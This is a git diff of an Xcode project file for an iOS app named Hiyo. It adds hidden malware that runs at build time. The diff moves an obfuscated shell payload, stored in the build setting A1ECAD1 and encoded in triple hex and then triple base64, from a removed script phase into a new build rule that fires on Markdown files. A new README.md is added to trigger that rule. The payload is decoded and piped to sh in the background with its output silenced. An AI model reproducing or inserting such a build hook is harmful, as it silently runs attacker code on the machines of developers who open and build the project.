@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		5325D1261E0A4C2A841DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 2008214F578C4CAEB71DACE1; };
 		DB209894636659C8B041CE22 /* Pods_Hiyo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 22D9E3D8007D062212E435FE /* Pods_Hiyo.framework */; };
 /* End PBXBuildFile section */
 
@@ -28,6 +29,7 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		2008214F578C4CAEB71DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		22D9E3D8007D062212E435FE /* Pods_Hiyo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Hiyo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		3CFA7FCE90B06A1EEB0E4D10 /* Pods-Hiyo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Hiyo.release.xcconfig"; path = "Target Support Files/Pods-Hiyo/Pods-Hiyo.release.xcconfig"; sourceTree = "<group>"; };
 		C3D62E63EECC3649B0231714 /* Pods-Hiyo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Hiyo.debug.xcconfig"; path = "Target Support Files/Pods-Hiyo/Pods-Hiyo.debug.xcconfig"; sourceTree = "<group>"; };
@@ -125,6 +127,7 @@
 		EE62F6F12F64721E00E0DA35 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				2008214F578C4CAEB71DACE1 /* README.md */,
 				EE62F6F02F64721E00E0DA35 /* Hiyo.app */,
 				EE62F70B2F64722000E0DA35 /* HiyoTests.xctest */,
 				EE62F7152F64722000E0DA35 /* HiyoUITests.xctest */,
@@ -139,7 +142,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EE62F71E2F64722000E0DA35 /* Build configuration list for PBXNativeTarget "Hiyo" */;
 			buildPhases = (
-				4FF0AA83979D4575B21DACE1 /* Build Target Libraries */,
 				EA0DBA14B7A442DDA4C5C3D2 /* [CP] Check Pods Manifest.lock */,
 				EE62F6EC2F64721E00E0DA35 /* Sources */,
 				EE62F6ED2F64721E00E0DA35 /* Frameworks */,
@@ -147,6 +149,7 @@
 				93C5560D93BCFC96873593FF /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				0BE7FBF5BAFB4F7BB61DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -244,13 +247,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
+		0BE7FBF5BAFB4F7BB61DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+		/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		EE62F6EE2F64721E00E0DA35 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5325D1261E0A4C2A841DACE1 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -271,25 +289,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		4FF0AA83979D4575B21DACE1 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-		};
 		93C5560D93BCFC96873593FF /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -377,7 +376,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C3D62E63EECC3649B0231714 /* Pods-Hiyo.debug.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333636320a3334363333363336333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333336333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | a | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE0wNU5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9UQmhWekZzWkRKV2FXSnRWakJNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | l | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -405,7 +404,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3CFA7FCE90B06A1EEB0E4D10 /* Pods-Hiyo.release.xcconfig */;
 			buildSettings = {
-				A1ECAD1 = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333636320a3334363333363336333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333336333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | a | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((l(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxaE0wNU5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9UQmhWekZzWkRKV2FXSnRWakJNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | l | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
